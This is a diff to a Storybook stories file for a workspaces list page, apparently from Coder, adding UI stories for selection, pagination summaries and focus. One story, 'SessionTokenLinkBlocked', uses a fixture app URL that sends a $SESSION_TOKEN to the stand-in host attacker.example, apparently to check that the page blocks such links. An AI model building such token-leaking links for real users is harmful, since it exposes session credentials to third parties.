@@ -2,7 +2,7 @@ import type { Meta, StoryObj } from "@storybook/react-vite";
 import dayjs from "dayjs";
 import uniqueId from "lodash/uniqueId";
 import { useState } from "react";
-import { expect, fn, userEvent, within } from "storybook/test";
+import { expect, fn, screen, userEvent, within } from "storybook/test";
 import {
 	type Workspace,
 	type WorkspaceStatus,
@@ -182,6 +182,19 @@ const meta: Meta<typeof WorkspacesPageView> = {
 export default meta;
 type Story = StoryObj<typeof WorkspacesPageView>;
 
+const StatefulWorkspacesPageView: Story["render"] = (args) => {
+	const [checkedWorkspaces, setCheckedWorkspaces] = useState(
+		args.checkedWorkspaces,
+	);
+	return (
+		<WorkspacesPageView
+			{...args}
+			checkedWorkspaces={checkedWorkspaces}
+			onCheckChange={setCheckedWorkspaces}
+		/>
+	);
+};
+
 export const SelectAllMixedEligibility: Story = {
 	args: {
 		workspaces: [
@@ -191,24 +204,23 @@ export const SelectAllMixedEligibility: Story = {
 		],
 		count: 3,
 	},
-	render: function Render(args) {
-		const [checkedWorkspaces, setCheckedWorkspaces] = useState<
-			readonly Workspace[]
-		>([]);
-		return (
-			<WorkspacesPageView
-				{...args}
-				checkedWorkspaces={checkedWorkspaces}
-				onCheckChange={setCheckedWorkspaces}
-			/>
-		);
-	},
+	render: StatefulWorkspacesPageView,
 	play: async ({ canvasElement }) => {
 		await userEvent.click(
 			within(canvasElement).getByRole("checkbox", {
 				name: "Select all workspaces",
 			}),
 		);
+	},
+};
+
+export const SelectAllLabel: Story = {
+	args: SelectAllMixedEligibility.args,
+	play: async ({ canvasElement }) => {
+		within(canvasElement)
+			.getByRole("checkbox", { name: "Select all workspaces" })
+			.focus();
+		await screen.findByRole("tooltip", { name: "Select all workspaces" });
 	},
 };
 
@@ -227,18 +239,7 @@ export const SelectedIneligibleWorkspaces: Story = {
 		...NoEligibleWorkspaces.args,
 		checkedWorkspaces: NoEligibleWorkspaces.args?.workspaces,
 	},
-	render: function Render(args) {
-		const [checkedWorkspaces, setCheckedWorkspaces] = useState(
-			args.checkedWorkspaces,
-		);
-		return (
-			<WorkspacesPageView
-				{...args}
-				checkedWorkspaces={checkedWorkspaces}
-				onCheckChange={setCheckedWorkspaces}
-			/>
-		);
-	},
+	render: StatefulWorkspacesPageView,
 };
 
 export const FilteredPaginationSummary: Story = {
@@ -249,6 +250,37 @@ export const FilteredPaginationSummary: Story = {
 	play: async ({ canvasElement }) => {
 		const canvas = within(canvasElement);
 		await canvas.findByText(/^Filtered: Showing/);
+	},
+};
+
+export const FilteredSingleResult: Story = {
+	args: {
+		workspaces: [MockWorkspace],
+		count: 1,
+	},
+};
+
+export const UnfilteredSingleResult: Story = {
+	args: {
+		workspaces: [MockWorkspace],
+		count: 1,
+		filter: { ...defaultFilter, query: "", used: false },
+	},
+};
+
+export const LastPageWithOneResult: Story = {
+	args: {
+		workspaces: [MockWorkspace],
+		count: DEFAULT_RECORDS_PER_PAGE + 1,
+		page: 2,
+	},
+};
+
+export const UnfilteredEmptySummary: Story = {
+	args: {
+		workspaces: [],
+		count: 0,
+		filter: { ...defaultFilter, query: "", used: false },
 	},
 };
 
@@ -361,6 +393,19 @@ export const AllStates: Story = {
 		for (const img of images) {
 			expect(img).toHaveAttribute("alt");
 		}
+	},
+};
+
+export const WorkspaceNameFocused: Story = {
+	args: {
+		workspaces: allWorkspaces.slice(0, 3),
+		count: 3,
+	},
+	play: async ({ canvasElement }) => {
+		const link = await within(canvasElement).findByRole("link", {
+			name: allWorkspaces[0].name,
+		});
+		link.focus();
 	},
 };
 
@@ -636,6 +681,43 @@ export const InvalidAppUrl: Story = {
 	},
 };
 
+export const SessionTokenLinkBlocked: Story = {
+	args: {
+		workspaces: [
+			{
+				...MockWorkspace,
+				name: "session-token-link-blocked",
+				latest_build: {
+					...MockWorkspace.latest_build,
+					resources: [
+						{
+							...MockWorkspace.latest_build.resources[0],
+							agents: [
+								{
+									...MockWorkspaceAgent,
+									display_apps: [],
+									apps: [
+										{
+											...MockWorkspaceApp,
+											id: "blocked-app",
+											slug: "blocked-app",
+											display_name: "Blocked App",
+											health: "healthy",
+											external: true,
+											url: "vscode://coder.coder-remote/open?url=https://attacker.example&token=$SESSION_TOKEN",
+										},
+									],
+								},
+							],
+						},
+					],
+				},
+			},
+		],
+		count: allWorkspaces.length,
+	},
+};
+
 export const ShowOrganizations: Story = {
 	args: {
 		workspaces: [
@@ -694,6 +776,7 @@ export const WithCheckedWorkspaces: Story = {
 		checkedWorkspaces: allWorkspaces.slice(0, 2),
 		count: 5,
 	},
+	render: StatefulWorkspacesPageView,
 };
 
 // An invalid filter query returns an API validation error. The page suppresses
